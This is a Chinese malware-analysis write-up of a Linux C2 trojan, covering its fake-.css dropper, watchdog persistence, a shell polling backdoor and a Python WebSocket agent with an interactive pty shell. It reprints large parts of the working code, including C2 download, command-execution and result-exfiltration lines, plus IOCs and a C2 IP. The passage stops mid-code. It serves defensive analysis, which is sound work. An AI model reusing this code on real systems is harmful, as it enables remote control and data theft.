---
title: 【先知】基于Linux的C2远控木马分析
source: https://xz.aliyun.com/news/92662
source_host: xz.aliyun.com
clip_date: 2026-08-11T15:11:19+08:00
trace_id: 13332259-1e46-4d61-9006-7203b8004a36
content_hash: 95e33249a636e6c35741a835aa2ff1f1580a1ab1ce76ef4774ba789010297463
status: synced
tags:
  - 先知
  - Linux安全
  - 恶意样本
series: null
feed_source: 先知安全技术社区
ai_summary: 某Linux C2远控木马以伪装CSS的curl命令投递，经恶意shell脚本部署ELF主木马及shell/python回退载荷，具备WebSocket交互终端、命令执行、看门狗持久化和反取证能力。
ai_summary_style: key-points
images_status:
  total: 27
  succeeded: 27
  failed_urls: []
notion_page_id: 3b975244-d011-8142-8990-f45dd828c66b
ioc:
  cves: []
  cwes: []
  hashes:
    - 03449f94ef50f9c3bf5f1fa8d480810f1350497b
    - 4f86f8078479219627258c4813a2800a7f654178
    - 55ceed32d9c4570f79017f3877fe51ffbad2e7ab8f40dfc1a5e99e185286c28f
    - 6668dc294d637a317c0651f25823e477
    - 702d256533d59c853e9e382c2525b52b7934b023e2e8a97146845473043ae7c1
    - e579e7a05f3ca2283d611e5799e1756a
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 某Linux C2远控木马以伪装CSS的curl命令投递，经恶意shell脚本部署ELF主木马及shell/python回退载荷，具备WebSocket交互终端、命令执行、看门狗持久化和反取证能力。
> 
> - **投递链：** 攻击者用curl下载伪装为.css的zip，解压后为shell投递器；投递器先清空命令历史、挑选可写可执行目录，再用curl/wget/busybox/python/perl多方式下载载荷，校验ELF魔术数后启动。
> - **主ELF配置：** mulu-agent-c是静态链接64位未加壳ELF，默认C2为127.0.0.1:8123，实际通过MULU_C2/MULU_TK/MULU_ALLOW_ARGS环境变量或argv传入C2和token，支持MULU_C2_LIST多C2轮换，经WebSocket /agent路径上线。
> - **回退载荷与功能：** 主ELF运行失败后依次加载s、p、p2三个降级载荷；s通过HTTP轮询/agent_sh、/agent_sh_poll、/agent_sh_result执行任意命令并回传base64结果；p/p2手写WebSocket协议，支持pty交互式shell、cmd_exec、fm_list文件浏览。
> - **持久化与反取证：** 投递器会安装看门狗脚本，每45-95秒随机抖动检查并自动重启被杀的主进程；组件清空HISTFILE，在/var/tmp或/dev/shm藏匿，使用.font-unix-id、.Xpy-cache、.cache-*.s/.o、dbus_daemon前缀等伪系统文件名；重跑时删除旧id/lock以生成新节点ID。
> - **IOC：** 投递器SHA-256为702d256533d59c853e9e382c2525b52b7934b023e2e8a97146845473043ae7c1，ELF SHA-256为55ceed32d9c4570f79017f3877fe51ffbad2e7ab8f40dfc1a5e99e185286c28f；C2为http://47.xx.xx.xx，Token为sbScLgnSQpClvQhZTshHfKF5_FAxBU3U，UA为Chrome 120，下载路径为/.svc/68b0e19e/11080546/{c,s,p,p2}。

## 一、背景

在最近特殊时期，客户服务器遭遇远控木马攻击，这里对遇到的C2木马展开分析。

## 二、摘要

本文记录了一次基于Linux的后门的分析过程。分析从投递器脚本入手，由投递器带出s、p、p2、mulu-agent-c 四个文件，文章分别对投递器和四个恶意文件进行详细分析。

## 三、木马投递器样本下载&分析

什么是投递器?

投递器（Dropper ) 它自身一般不具备窃取、远控、挖矿等最终恶意功能，唯一目标是把真正的恶意载荷（Payload）投递并启动到目标主机。

### 1、投递器下载

态势设备抓到到攻击者首先执行木马投递器下载操作，这里从投递器开始分析。

curl [http: //47.xx.xx.xx/assets/css/chunk-12a394d6.css](http://47.110.42.209/assets/css/chunk-12a394d6.css) -o 1111.zip（伪装成.css文件）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/44ca0da9415bc4f1.png)

解压缩

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/516d1b566df2de32.png)

打开样本文件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/24c89779b43d0c1e.png)

### 2、威胁情报平台分析

（1）VT标记为木马程序，文件类型为shell。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ce56ac2a70531531.png)

（2）安恒云沙箱标记为MalSusp木马

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1acb5b40123d255c.png)

### 3、功能模块分析

这部分直接用编辑器打开shell文件，下面按照获取的从前往后逐个函数及指令分析。

#### 模块 1：隐蔽与反取证（2-3行）

```bash
# 【反取证】设置历史文件为 /dev/null、历史大小为 0，并限定PATH到常用系统目录
export HISTFILE=/dev/null HISTSIZE=0 PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
# 【反取证】再 unset 历史相关变量，确保 bash/zsh 都不记录命令历史
unset HISTFILE HISTSIZE HISTFILESIZE
```

这部分主要是清空并禁用 shell 命令历史记录，确保后续下载、执行等行为不被写入 `.bash_history` 等文件。

#### 模块 2：配置与网络端点（4-12）

固定常量，构成与 C2 的通信契约：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/5ee603329b055b5c.png)

|     |     |     |
| --- | --- | --- |  
| 变量  | 值   | 用途  |
| `UL` | `http://47.xx.xx.xx` | C2 服务器（主，可扩展为列表） |
| `U` | `UL` 的首字段 | 当前 C2 地址 |
| `K` | `sbScLgnSQp...FAxBU3U` | 通信 Token / 鉴权密钥 |
| `CP` | `/.svc/.../c` | 主 ELF 木马下载端点 |
| `SP` | `/.svc/.../s` | shell 回退载荷端点 |
| `PP` | `/.svc/.../p` | python3 载荷端点 |
| `P2P` | `/.svc/.../p2` | python2 载荷端点 |
| `A` | Chrome 120 UA | 伪装为正常浏览器 |

#### 模块 3：可执行目录探测 pick_dir（13-26）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/bc441e6cc19122e9.png)

```plain
依次测试目录: XDG_RUNTIME_DIR → /dev/shm → /var/tmp → /tmp → $HOME → .
每个目录: 写入 exit-0 测试脚本 → chmod 700 → 执行成功?
  └─ 成功: 返回该目录（既能写、又能执行）
  └─ 失败: 继续下一个
全失败: 回退 /tmp
```

这部分主要功能是寻找一个可写且未挂载 noexec 的目录，确定的目录用于存放木马二进制。（典型的"环境自适应"绕过手段。）

#### 模块 4：旧实例清理与复活机制（28-30）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2110c5f85b3204ac.png) 代码里翻译下看看

#manual relaunch: clear old node ids/locks so deleted old install stays banned but this fresh command gets a new id

翻译：手动重新启动：清除旧的节点ID/锁，使已删除的旧安装保持被禁状态，而此新命令可获得一个新的ID

```bash
删除各目录下的旧 id/lock/cache 文件:
.font-unix-id 
.font-unix-lock 
.Xpy-cache 
.Xpy2-cache
.sys-id 
.sys-id.lock 
.user-id 
.user-id.lock
```

这部分清除上一轮安装遗留的节点标识与锁文件。这是多实例/复活机制——使得每次重跑都能生成新节点 ID（规避去重封禁），同时不影响已被运维清理的旧节点记录。

#### 模块 5：多协议下载器 dl() （<font style="background-color:#E7E9E8;">34-58</font>）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c077460f190de5a5.png)

按优先级尝试 6 种下载方式：

|     |     |
| --- | --- | 
| 工具  | 备注  |
| `curl` | 3 种参数变体（含超时、UA） |
| `wget` | 2 种参数变体 |
| `busybox wget` | 精简系统 |
| `python3 + urllib` | 现代 Python |
| `python + urllib` | 旧 Python |
| `perl + LWP::Simple` | 老式服务器 |

这部分主要功能是通过不同方式下载病毒文件，每步都校验 `[ -s "$out" ]` （文件非空）才算成功。

#### 模块 6：ELF 合法性校验 is_elf()（67-80）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/abcf09e891c48779.png)

```plain
读取文件头 4 字节, 判定是否等于魔术数 7f454c46 (即 "\x7fELF")
依次尝试: od → hexdump → dd
若工具链缺失, 退化为"文件 >10KB 即视为有效"
```

这部分主要功能是校验下载的载荷是否为 Linux ELF 可执行文件，防止因 CDN 缓存错误、C2 故障、链路污染而执行垃圾数据。

#### 模块 7：主木马启动器 start_bin（）（81-109）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/374bfcce3c1e6434.png)

```bash
# 【函数 start_bin】启动主ELF木马，注入C2配置；失败则在多目录间重试
start_bin(){
  is_elf "$BIN" || return 1       # 先校验是ELF
  chmod +x "$BIN" 2>/dev/null || chmod 755 "$BIN" 2>/dev/null  # 赋可执行权限
  RUN="$BIN"
  # nohup 后台启动；通过环境变量注入C2地址/列表/Token，同时argv也传一份
  MULU_ALLOW_ARGS=1 MULU_C2="$U" MULU_C2_LIST="$UL" MULU_TK="$K" nohup "$RUN" "$U" "$K" "$UL" </dev/null >/dev/null 2>&1 &
  BPID=$!
  sleep 3; kill -0 "$BPID" 2>/dev/null && return 0   # 等3s，进程还在=成功
  sleep 3; kill -0 "$BPID" 2>/dev/null && return 0   # 再等3s
  sleep 2; kill -0 "$BPID" 2>/dev/null && return 0   # 再等2s
  # 若失败（noexec或崩溃）：复制到其它可写目录逐一重试
  for d in /var/tmp /tmp "$HOME" /dev/shm .; do
    [ -n "$d" ] && [ -w "$d" ] || continue
    nb="$d/.x$R"
    [ "$nb" = "$BIN" ] && continue
    cp -f "$BIN" "$nb" 2>/dev/null || continue       # 复制二进制
    chmod 755 "$nb" 2>/dev/null
    MULU_ALLOW_ARGS=1 MULU_C2="$U" MULU_C2_LIST="$UL" MULU_TK="$K" nohup "$nb" "$U" "$K" "$UL" </dev/null >/dev/null 2>&1 &
    BPID=$!
    sleep 2
    if kill -0 "$BPID" 2>/dev/null; then BIN="$nb"; return 0; fi  # 起来了则更新BIN路径并成功
  done
  # 最终兜底：用 pgrep 看是否有同名进程存活
  if command -v pgrep >/dev/null 2>&1; then
    pgrep -f "\.x$R" >/dev/null 2>&1 && return 0
  fi
  return 1
}
```

```bash
# 主程序执行过程
# 1. 校验 ELF + 赋可执行权限
# 2. nohup 后台启动, 注入:
MULU_ALLOW_ARGS=1
MULU_C2="$U"           # 主 C2
MULU_C2_LIST="$UL"     # C2 列表（支持多 C2 备份）
MULU_TK="$K"           # Token
$RUN "$U" "$K" "$UL"   # 同时以命令行参数传入
# 3. 多次 sleep + kill -0 确认进程存活
# 4. 若失败: 复制二进制到 /var/tmp /tmp $HOME /dev/shm . 逐一重试
# 5. 最终 pgrep 兜底
```

注入的参数语义：

`MULU_C2` ：默认回连 C2

`MULU_C2_LIST` ：备用 C2 列表（主 C2 失联时可切换）

`MULU_TK` ：鉴权/加密密钥

`MULU_ALLOW_ARGS` ：允许木马从命令行读取参数（而非仅环境变量）

这部分是主程序，启动主 C2 客户端（带交互式 PTY 终端的核心木马），以环境变量 + 命令行参数双通道传递 C2 配置，并具备多目录重试以对抗 noexec。

#### 模块 8：回退载荷 start_sh / start_py（110-138）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/50c187dd4e5cdeff.png)

为了方便与第二部分对应，这里对一下文件名称

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d76fea7be92179d8.png)

start_sh()函数下载 shell 载荷（ `SP` ）后后台执行；若下载失败，则用 `curl ... | sh` 或 `wget -O- ... | sh` 管道直接执行。(这里sp对应下载的第二部分下载的s文件)

start_py()函数优先 python3 载荷（ `PP` ），其次 python2 载荷（ `P2P` ），后台执行。（这里的pp文件对应第二部分的p文件，p2p对应的是p2文件）

当主 ELF 因架构不匹配、noexec、权限等无法运行时，提供 shell/python 两种降级回连通道，确保攻击者至少有一个回连入口。

#### 模块 9：持久化看门狗 install_wd（139-163）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7a4534d275e05e89.png)

生成一段内嵌 while 死循环的看门狗脚本 `$WD` ：

```bash
while :; do
  若 $BIN 存在且 pgrep 找不到其进程 → 重新 nohup 拉起(同 MULU_* 参数)
  sleep $((45 + $$ % 50))   # 45~95 秒, 带随机抖动
done
```

周期性（约 1 分钟级，带抖动规避周期性检测）检查主木马是否存活，若被杀则自动重启，形成"杀不死"的保活机制。构成该木马最难清剿的部分——单纯 `kill` 主进程无效，必须先清掉看门狗及其载体。

#### 模块 10：主控流程（164-183）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/16c24506b5b2b122.png)

先看代码里关键的注释：

#Prefer C-elf (interactive terminal needs live WS). Retry C; sh only if C truly fails.

翻译：优先使用 C-elf（交互式终端需要实时 WebSocket）。若 C 失败则重试；仅在 C 真正失败时才使用 sh。

#C failed (arch/noexec/cap): last-resort sh-poll (no real PTY terminal)

翻译：C 失败（arch/noexec/cap）：最后的 sh-poll 方案（无真实 PTY 终端）

```plain
重试最多3次以下循环:
  下载CP(主ELF) → start_bin(启动ELF) → install_wd(安装看门狗) → 标记成功
  失败: rm 删除该二进制, 退避后重试

若3次仍失败:
  start_sh → start_py  (依次加载回退载荷)
```

这部分编排整体投放，优先使用能力最强的"交互式 ELF 客户端"，仅在彻底失败时降级，失败后依次加载shell、python脚本维持权限。

### 4、投递链总览

```plain
[环境清理/隐藏痕迹]
        │
        ▼
[选择可执行可写目录 pick_dir]
        │
        ▼
[多协议下载主ELF (dl / dl_any)]  ←─ 端点 CP
        │
        ▼
[ELF校验 (is_elf)]
        │
        ▼
[后台启动主木马 (start_bin)]  ──→ 注入 MULU_* 参数与C2
        │
        ▼
[安装看门狗 (install_wd)]  ───→ 周期性保活
        │
     成功?──否──▶ [回退: start_sh / start_py]  ←─ 端点 SP / PP / P2P
        │
        ▼
     退出 0
```

## 四、木马样本下载&分析

### 1、木马样本下载

根据第一部分加载器分析逻辑，根据链接下载病毒样本

CP='/.svc/68b0e19e/11080546/c'

SP='/.svc/68b0e19e/11080546/s'

PP='/.svc/68b0e19e/11080546/p'

P2P='/.svc/68b0e19e/11080546/p2'

拼接后使用浏览器访问或者使用py脚本下载

[http: //47.xx.xx.xx](http://47.xx.xx.xx/) /.svc/68b0e19e/11080546/c

[http: //47.xx.xx.xx](http://47.xx.xx.xx/) /.svc/68b0e19e/11080546/s

[http: //47.xx.xx.xx](http://47.xx.xx.xx/) /.svc/68b0e19e/11080546/p

[http: //47.xx.xx.xx](http://47.xx.xx.xx/) /.svc/68b0e19e/11080546/p2

下载后的文件：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/666bd5c967755810.png)

### 2、木马样本分析

这部分根据上部分"模块8"的分析，优先分析elf木马文件未成功运行时的权限维持方式（s、p、p2）。

#### 文件1：s（shell脚本）

##### 1、威胁情报平台分析

VT判断为shell脚本

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7a4421f0a8686ea2.png)

脚本原文截图如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6d07b3d41a3360f8.png)

##### 2、功能模块分析

###### 模块1：反取证抹除历史痕迹

```bash
export HISTFILE=/dev/null PATH=/usr/bin:/bin:/usr/sbin:/sbin
unset HISTFILE HISTSIZE HISTFILESIZE
```

这两行是干反取证的。先把命令历史写进 /dev/null 这个黑洞，顺手把 PATH 收紧到系统标准目录，免得依赖受害者原有的环境变量。下面又用 unset 把几个历史相关变量一起清掉，等于上了双重保险。这么一搞，事后想从 shell 历史里翻攻击痕迹基本没戏。

###### 模块2：C2 配置常量

```bash
C2S='http://47.xx.xx.xx'
TOKEN='sbScLgnSQpClvQhZTshHfKF5_FAxBU3U'
```

这里是把几个关键常量一次性配好。C2S 就是它的控制服务器，47.xx.xx.xx，明文 HTTP。TOKEN是密钥。

###### 模块3：工作目录降级选择

```bash
[ -d "$HOME_D" ] || HOME_D=/var/tmp
[ -w "$HOME_D" ] || HOME_D=/tmp
```

这两行是给工作目录找退路。首选的内存盘要是不存在，就退到 /var/tmp，再不行退到 /tmp。这么三档兜底下来，哪怕遇到受限环境或者权限不够，也能找个可写的地方放运行文件，落地成功率有保障。

###### 模块4：单实例锁 + 受害机唯一 ID

```bash
IDF=$HOME_D/.font-unix-id
LOCK=$HOME_D/.font-unix-lock
if [ -f "$LOCK" ]; then old=$(cat "$LOCK" 2>/dev/null); if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then exit 0; fi; fi
echo $$ > "$LOCK" 2>/dev/null
[ -f "$IDF" ] && ID=$(cat "$IDF" 2>/dev/null)
[ -z "$ID" ] && ID=$(od -An -N4 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')
[ -z "$ID" ] && ID=$$
echo "$ID" > "$IDF" 2>/dev/null
```

这段管两件事，一是别让后门重复开多个，二是给受害机发个身份证。文件名故意起得像 X11 字体服务那种系统文件，管理员瞄一眼也不会怀疑。锁文件里记着上次跑的进程号，要是那个进程还活着，这次就直接静默退出，免得好几个 Beacon 一起通信把流量搞异常被发现。身份证这块，能复用就复用旧的，这样主机重启后 C2 还能认出是同一台，方便长期控着；第一次跑就从随机数生成一个 ID，不规律也不依赖 MAC 这种好猜的东西，实在生成不出来就拿进程号顶上，保证再怎么也能上线。

###### 模块5：工具函数 —— base64 与 HTTP 封装

```bash
b64dec(){ base64 -d 2>/dev/null || base64 -D 2>/dev/null; }
b64enc(){ base64 2>/dev/null | tr -d '\n'; }
http_get(){ u="$1"; t="${2:-15}"; curl -fsS -m "$t" -A "$UA" -H 'Accept: */*' "$u" 2>/dev/null || wget -qO- --timeout="$t" --user-agent="$UA" "$u" 2>/dev/null; }
```

这里封装了三个常用函数。b64dec 解码时先试 GNU 的写法不行再试 BSD 的，换什么系统都能跑。b64enc 编码完顺手把换行去掉，方便塞进表单传出去。http_get 是请求函数，能用 curl 就用 curl，不行就退到 wget，超时和 UA 都统一好。这种双工具兜底的意思是，环境里哪怕只有这俩中的一个，照样能联网，兼容性拉满。

###### 模块6：上线抖动与 C2 轮换准备

```bash
IJ=$(( $(printf '%s' "$ID" | od -An -tu1 2>/dev/null | tr -d ' \n' | tail -c 2) % 13 ))
sleep "$IJ" 2>/dev/null || true
backoff=0
ci=0
set -- $C2S
NC=$#
[ "$NC" -lt 1 ] && set -- 'http://47.xx.xx.xx' && NC=1
```

这段在正式上线前做了点铺垫。它拿 ID 的末两位算个 0 到 12 的抖动值，上线前先睡这么久，把不同机器的上线时间错开，免得一堆 Beacon 同一秒一起回连，那流量峰太扎眼了。然后顺手把退避计数和 C2 轮换计数都清零，把 C2 地址拆成列表好按序号取，要是一个都没配就兜底用默认地址，反正保证有口子能连。

###### 模块7：主循环、心跳上报主机信息

```bash
while :; do
  eval C2=\$$((ci+1))
  [ -z "$C2" ] && C2="$1"
  HOST=$(hostname 2>/dev/null | tr ' /?' '___')
  USER=$(id -un 2>/dev/null | tr ' /?' '___')
  OS=$(uname -s 2>/dev/null)_$(uname -m 2>/dev/null)_sh
  HB="$C2/agent_sh?token=$TOKEN&id=$ID&host=$HOST&user=$USER&os=$OS"
  if http_get "$HB" 10 >/dev/null; then backoff=0; else backoff=$((backoff+1)); ci=$(( (ci+1) % NC )); fi
```

这就是主循环了，一个死循环一直跑。每轮先按序号挑当前用哪个 C2，然后把主机名、当前用户、系统架构这些信息凑成心跳包发到 /agent_sh，等于给攻击者报个到，顺便告诉他这台机器叫什么、当前是不是 root、什么架构好分发对应载荷。连上了就把退避清零，连不上就退避加一、换下一个 C2 再试，这样单个控制端挂了也能自动切。

###### 模块8：拉取并解析下发的命令

```bash
  POLL="$C2/agent_sh_poll?token=$TOKEN&id=$ID"
  R=$(http_get "$POLL" 20)
  case "$R" in
    CMD:*)
      REQ=$(printf '%s' "$R" | cut -d: -f2)
      CB64=$(printf '%s' "$R" | cut -d: -f3-)
      CMD=$(printf '%s' "$CB64" | b64dec)
```

这段是去问控制端有没有活儿干。它请求 /agent_sh_poll 这个取令端点。回来的内容要是以 CMD 开头，才算是下发的命令包，接着按冒号切开，把请求号和 base64 命令分别取出来，第三段往后全算命令内容，这是为了照顾命令本身带冒号的情况。请求号留着回头回传时对账用，命令 base64 解一下就拿到了明文，既不怕特殊字符，也不容易被关键字检测逮到。

###### 模块9：执行任意命令并编码输出

```bash
OUTF=$HOME_D/.shout_$$
sh -c "$CMD" >"$OUTF" 2>&1; RC=$?
OB64F=$HOME_D/.shb64_$$
b64enc <"$OUTF" >"$OB64F" 2>/dev/null || base64 <"$OUTF" 2>/dev/null | tr -d '\n' >"$OB64F"
```

这地方就是后门最毒的地方了。它用 sh -c 把刚才解出来的命令直接执行，输出存进临时文件，顺便记下退出码，等于攻击者想在机器上干啥都行，下载荷、偷数据、横向、提权破坏全从这里发起。执行完把输出 base64 编一下码留着回传用，编码函数万一不好使就直接调 base64 兜底。

###### 模块10：回传执行结果与痕迹清理

```bash
 # --data-urlencode out@file 避免 ARG_MAX；body 保持 x-www-form-urlencoded
      curl -fsS -m 90 -A "$UA" -X POST \
        --data-urlencode "token=$TOKEN" --data-urlencode "id=$ID" --data-urlencode "req=$REQ" --data-urlencode "rc=$RC" \
        --data-urlencode "out@$OB64F" "$C2/agent_sh_result" >/dev/null 2>&1 || {
        OB64=`cat "$OB64F" 2>/dev/null`; curl -fsS -m 90 -A "$UA" -X POST -d "token=$TOKEN&id=$ID&req=$REQ&rc=$RC" --data-urlencode "out=$OB64" "$C2/agent_sh_result" >/dev/null 2>&1 || true; }
      rm -f "$OUTF" "$OB64F" 2>/dev/null
```

这段把执行结果送回控制端并收拾现场。它用 POST 把结果发到 /agent_sh_result。输出大就用 out 加文件的方式从文件读，绕开命令行参数长度上限，免得大输出被截断。第一次发不出去就退一步，把文件内容读进变量再发一次，再发不出去就拿 true 把错误吞了，这么层层兜底就是为了让结果尽量送回去，又不让脚本因为报错意外退出。最后把临时文件全删了，磁盘上干干净净不留痕。

###### 模块11：轮询间隔抖动与失败退避

```bash
  j=$((1 + ($$ + IJ) % 3))
  [ "$backoff" -gt 2 ] && j=$((j + backoff))
  [ "$j" -gt 12 ] && j=12
  sleep "$j" 2>/dev/null || sleep 2
done
```

这段管下一轮等多久。它拿进程号加抖动值算个 1 到 3 秒的基础间隔，又是一次抖动，让各机器的节奏都不一样不规则，躲开那种盯着固定间隔的流量检测。要是连着失败，就把退避叠加上去多睡会儿，少发点无效请求，但最多睡 12 秒封顶，免得睡太久把自己睡失联了。sleep 万一异常就用固定 2 秒兜底，不能因为没延迟把 CPU 跑满或者高频请求暴露自己。

#### 文件2：p（py脚本）

##### 1、威胁情报平台分析

VT判断为py脚本

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3f17894f995b7bf5.png)

打开脚本分析，脚本是python3写的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6ac162a265cf654a.png)

##### 2、功能模块分析

###### 模块1：C2 与节点身份配置

```python
C2='http://47.xx.xx.xx'; TOKEN='sbScLgnSQpClvQhZTshHfKF5_FAxBU3U'; NODE_FILE='/dev/shm/.Xpy-cache'
GUID='258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
```

这里配好三个关键值。C2 还是 47.xx.xx.xx。NODE_FILE 是存节点身份的文件，放在 /dev/shm 内存盘里，名字伪装成.Xpy-cache 像个缓存文件，重启就没了，隐蔽性同款。GUID 其实是 WebSocket 协议规定的魔法串，后面握手时要用。

###### 模块2：节点 ID 生成与读取

```python
def nodeid():
    try: return open(NODE_FILE).read().strip()
    except: pass
    x=str(uuid.uuid4())[:8]
    try: open(NODE_FILE,'w').write(x)
    except: pass
    return x
NID=nodeid()
```

这段给受害机发"身份证"。先试着读已有的 ID 文件，能读到就复用，这样主机重启后控制端还能认出是同一台，方便长期控着；读不到就现生成一个 8 位的 uuid 当新身份写进文件。和 s 文件的思路一模一样，就是要身份稳定又随机，不依赖好猜的硬件信息，写进内存盘还方便藏。

###### 模块3：WebSocket 握手地址拼装

```python
def ws_url(u):
    p=urllib.parse.urlparse(u); host=p.hostname; port=p.port or (443 if p.scheme=='https' else 80); path='/agent?token='+TOKEN+'&id='+NID
    return p.scheme,host,port,path
```

这个函数把 C2 地址拆成协议、主机、端口、路径，路径固定走 /agent，并把 TOKEN 和节点 ID 拼进去做上线身份。这一步是为后面建立 WebSocket 长连接做准备，/agent 是它的核心 IoC 路径。

###### 模块4：建立加密 WebSocket 连接

```python
def connect():
    scheme,host,port,path=ws_url(C2); s=socket.create_connection((host,port),20)
    if scheme=='https': s=ssl.wrap_socket(s,server_hostname=host)
    key=base64.b64encode(os.urandom(16)).decode()
    req='GET %s HTTP/1.1\r\nHost: %s:%s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n'%(path,host,port,key)
    s.sendall(req.encode()); resp=s.recv(4096)
    if b'101' not in resp.split(b'\r\n',1)[0]: raise Exception(resp[:80])
    return s
```

这段是核心升级点，它不像 s 文件那样反复 HTTP 轮询，而是 WebSocket 握手建一条长连接。先建 TCP 连接，https 的话再裹一层 ssl 加密，比 s文件的明文 HTTP 强不少，更难被中间链路看清。

按 WebSocket 协议发一个 GET 请求，带上随机生成的 Sec-WebSocket-Key，等服务端回 101 切换协议就算握手成功。长连接的好处是省去反复轮询的流量特征，实时性也好，控制端推命令过来立刻就能接到，比s文件按那种隔几秒问一次的笨办法隐蔽和高效得多。

###### 模块5：WebSocket 帧的发送与接收

```python
def send(s,obj):
    data=json.dumps(obj,ensure_ascii=False).encode(); ln=len(data); head=b'\x81'; mask=os.urandom(4)
    if ln<126: head+=bytes([0x80|ln])
    elif ln<65536: head+=bytes([0x80|126])+struct.pack('!H',ln)
    else: head+=bytes([0x80|127])+struct.pack('!Q',ln)
    s.sendall(head+mask+bytes(data[i]^mask[i%4] for i in range(ln)))
def recv(s):
    h=s.recv(2)
    if not h or len(h)<2: return None
    b1,b2=h[0],h[1]; ln=b2&127
    if ln==126: ln=struct.unpack('!H',s.recv(2))[0]
    elif ln==127: ln=struct.unpack('!Q',s.recv(8))[0]
    data=b''
    while len(data)<ln:
        c=s.recv(ln-len(data))
        if not c: return None
        data+=c
    if (b1&15)==8: return None
    return json.loads(data.decode('utf-8','ignore'))
```

这两个函数自己手实现了 WebSocket 协议的封包解包，没用现成库。send 把 JSON 消息按协议打成帧，按数据长度分三档填长度字段，客户端发出去还要按规矩用随机掩码异或一遍，完全合规的客户端实现。recv 反过来解帧，按长度头读够字节数，收到协议规定的关闭帧就返回 None 让上层断线重连，正常帧就解出 JSON。自己撸协议的好处是不依赖 websocket 库，纯标准库就能跑，落地环境要求更低，也更难被基于库特征的检测盯上。所有业务消息都用 JSON 传。

###### 模块6：交互式 Shell 会话

```python
shells={}
def sh_open(s,sid):
    if sid in shells: return
    pid,fd=pty.fork()
    if pid==0:
        os.environ['TERM']='xterm-256color'; os.environ['SHELL']='/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'; sh=os.environ['SHELL']; os.execl(sh, os.path.basename(sh), '-i')
    fcntl.fcntl(fd, fcntl.F_SETFL, os.O_NONBLOCK)
    shells[sid]=(pid,fd)
    def reader():
        while sid in shells:
            try:
                r,_,_=select.select([fd],[],[],0.2)
                if r:
                    data=os.read(fd,4096).decode('utf-8','ignore')
                    if data: send(s,{'type':'shell_out','sid':sid,'data':data})
            except Exception as e: break
        try: os.close(fd)
        except: pass
    threading.Thread(target=reader,daemon=True).start()
```

这是比 s 文件高级的地方，它支持完整的交互式终端。用 pty.fork 直接 fork 出一个伪终端，子进程里起一个交互式 bash 或者 sh，就像用户自己开了个终端一样。这样 vim、top、sudo 这种需要 TTY 的交互命令都能正常跑。父进程把伪终端设成非阻塞，再起个后台线程专门盯着这个终端，有输出就立刻通过 WebSocket 推给控制端，输入那边收到 shell_in 消息就写进伪终端。多会话用 sid 区分，能同时挂好几个 shell，这在实战渗透里等于给攻击者开了一扇随进随出的活门。

###### 模块7：文件管理列表功能

```python
def fm_list(path):
    if not os.path.isdir(path): path=os.path.dirname(path) or '/'
    items=[]
    try:
        for name in sorted(os.listdir(path)):
            fp=os.path.join(path,name)
            try: st=os.lstat(fp); isd=os.path.isdir(fp); items.append({'name':name,'path':fp,'type':'d' if isd else 'f','size':st.st_size,'mode':oct(st.st_mode)[-3:],'mtime':int(st.st_mtime)})
            except: pass
    except Exception as e: return path, [], str(e)
    return path,items,''
```

这是个文件浏览功能，按路径列出目录里的文件和子目录，每条带上大小、权限、修改时间，打包成 JSON 回传。等于给控制端配了个简易文件管理器。

###### 模块8：主循环与消息分发

```python
def main():
  while True:
    try:
      s=connect(); send(s,{'type':'hello','id':NID,'host':socket.gethostname(),'user':os.popen('id -un 2>/dev/null').read().strip(),'os':os.popen('uname -a 2>/dev/null').read().strip()})
      while True:
        m=recv(s)
        if not m: break
        t=m.get('type')
        if t=='shell_open': sh_open(s,m['sid'])
        elif t=='shell_in':
          sid=m['sid']; data=m.get('data','')
          if sid in shells: os.write(shells[sid][1], data.encode())
        elif t=='cmd_exec':
          req=m.get('req',''); cmd=m.get('cmd',''); timeout=int(m.get('timeout',60) or 60)
          try:
            p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE)
            end=time.time()+timeout; out=b''
            while time.time()<end and p.poll() is None:
              try:
                r,_,_=select.select([p.stdout],[],[],0.2)
                if r: out+=os.read(p.stdout.fileno(),4096)
              except Exception: break
            if p.poll() is None:
              try: p.kill()
              except Exception: pass
            try: out+=p.stdout.read() or b''
            except Exception: pass
            rc=p.returncode if p.returncode is not None else -9
            if not isinstance(out,str): out=out.decode('utf-8','ignore')
            send(s,{'type':'cmd_result','req':req,'rc':rc,'out':out})
          except Exception as e:
            send(s,{'type':'cmd_result','req':req,'rc':-1,'out':repr(e)})
        elif t=='fm_list':
